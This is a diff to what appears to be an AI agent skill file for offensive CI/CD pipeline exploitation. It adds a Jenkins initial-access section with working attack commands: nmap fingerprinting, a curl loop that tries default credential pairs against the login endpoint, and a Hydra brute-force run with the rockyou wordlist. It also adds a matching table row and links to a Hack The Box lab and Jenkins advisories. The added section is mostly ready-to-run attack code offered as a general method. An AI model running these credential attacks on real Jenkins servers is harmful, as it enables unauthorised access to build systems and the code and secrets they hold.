@@ -1,6 +1,6 @@
 ---
 name: offensive-cicd-pipeline
-description: "Comprehensive CI/CD pipeline exploitation methodology covering GitHub Actions injection vectors (expression injection via PR titles and issue bodies, workflow_run event abuse, GITHUB_TOKEN over-scoping, composite action supply chain compromise), Jenkins attack paths (Groovy sandbox escapes, script console remote code execution, Java remoting deserialization, credential store dumping, shared library injection), GitLab CI exploitation (YAML anchor injection, runner registration token abuse, CI variable extraction, protected branch bypass via merge request pipelines), and Azure DevOps pipeline agent compromise with service connection theft. Includes artifact poisoning techniques across all platforms, tooling guidance for gato and jenkins-attack-framework, and maps to MITRE ATT&CK T1195.002 (Supply Chain Compromise: Compromise Software Supply Chain). Covers enumeration of pipeline configurations, privilege escalation from contributor to code execution, lateral movement through pipeline trust boundaries, and persistence via modified workflow definitions. Each technique section provides working exploitation code, detection indicators, and defensive countermeasures."
+description: "Comprehensive CI/CD pipeline exploitation methodology covering GitHub Actions injection vectors (expression injection via PR titles and issue bodies, workflow_run event abuse, GITHUB_TOKEN over-scoping, composite action supply chain compromise), Jenkins attack paths (default/weak credential login, Groovy sandbox escapes, script console remote code execution, Java remoting deserialization, credential store dumping, shared library injection), GitLab CI exploitation (YAML anchor injection, runner registration token abuse, CI variable extraction, protected branch bypass via merge request pipelines), and Azure DevOps pipeline agent compromise with service connection theft. Includes artifact poisoning techniques across all platforms, tooling guidance for gato and jenkins-attack-framework, and maps to MITRE ATT&CK T1195.002 (Supply Chain Compromise: Compromise Software Supply Chain). Covers enumeration of pipeline configurations, privilege escalation from contributor to code execution, lateral movement through pipeline trust boundaries, and persistence via modified workflow definitions. Each technique section provides working exploitation code, detection indicators, and defensive countermeasures."
 ---
 
 # Offensive CI/CD Pipeline Exploitation
@@ -134,6 +134,41 @@ gato search -t ghp_TOKENHERE -o target-org -sg
 Jenkins presents a broad attack surface through its script console, build configurations, shared
 libraries, and the Java remoting protocol. You target Jenkins when you discover it exposed on the
 network or when you obtain any level of authenticated access.
+
+### Weak / Default Credentials Initial Access
+
+Before looking for a vulnerability, check whether you need one. Jenkins installs that skip the
+setup wizard, or get redeployed from a saved `config.xml` without rotating accounts, commonly
+leave the controller reachable with `admin:admin`, `admin:password`, or no authentication realm
+at all. This is the entire initial-access path on beginner-tier boxes like HTB's Pennyworth: a
+bare Jenkins instance on port 8080 with default creds and admin-level Script Console access.
+
+```bash
+# Fingerprint the service and confirm it's Jenkins
+nmap -sV -p 8080 TARGET_IP
+curl -sS -I http://TARGET_IP:8080 | grep -i x-jenkins
+
+# Try the common default/weak credential pairs against the login form
+for creds in admin:admin admin:password admin:jenkins admin: root:root; do
+  user="${creds%%:*}"; pass="${creds##*:}"
+  code=$(curl -sS -o /dev/null -w '%{http_code}' \
+    -c /tmp/jenkins_cookies.txt -b /tmp/jenkins_cookies.txt \
+    --data-urlencode "j_username=${user}" --data-urlencode "j_password=${pass}" \
+    --data-urlencode "from=/" --data-urlencode "Submit=Sign in" \
+    "http://TARGET_IP:8080/j_security_check")
+  echo "${creds} -> HTTP ${code}"
+done
+
+# Or brute-force systematically with Hydra against the login endpoint
+hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET_IP -s 8080 http-post-form \
+  "/j_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
+```
+
+Once authenticated, confirm you landed on an account with `Overall/Administer` (or at minimum
+`Overall/RunScripts`) by checking that **Manage Jenkins -> Script Console** is reachable at
+`http://TARGET_IP:8080/script`. If it loads, you have unauthenticated-equivalent RCE on the
+controller via the Groovy payloads in the next section — no further privilege escalation needed
+on the Jenkins side.
 
 ### Groovy Script Console RCE
 
@@ -492,6 +527,7 @@ Key defensive controls:
 | GitHub Actions  | Expression injection         | Fork/PR (none)          | Runner RCE      |
 | GitHub Actions  | workflow_run artifact poison | Fork/PR (none)          | Default branch RCE |
 | GitHub Actions  | Composite action supply chain| Action repo write       | All consumers RCE |
+| Jenkins         | Default/weak credentials      | None (network access)   | Admin login -> RCE |
 | Jenkins         | Script console               | RunScripts permission   | Controller RCE  |
 | Jenkins         | Groovy sandbox escape        | Build configure         | Controller RCE  |
 | Jenkins         | Remoting deserialization     | Network access (50000)  | Controller RCE  |
@@ -511,6 +547,8 @@ Key defensive controls:
 - Cider Security (now Palo Alto) CI/CD Goat: https://github.com/cider-security-research/cicd-goat
 - gato - GitHub Actions enumeration and attack tool: https://github.com/praetorian-inc/gato
 - jenkins-attack-framework: https://github.com/Accenture/jenkins-attack-framework
+- Jenkins Security Advisories (default install hardening, CSRF/script security): https://www.jenkins.io/security/advisories/
+- HTB Pennyworth (default-credential Jenkins -> Script Console RCE, Easy difficulty): https://app.hackthebox.com/machines/Pennyworth
 - Abusing GitHub Actions (Synacktiv): https://www.synacktiv.com/en/publications
 - MITRE ATT&CK T1195.002: https://attack.mitre.org/techniques/T1195/002/
 - GitHub Actions Security Hardening: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
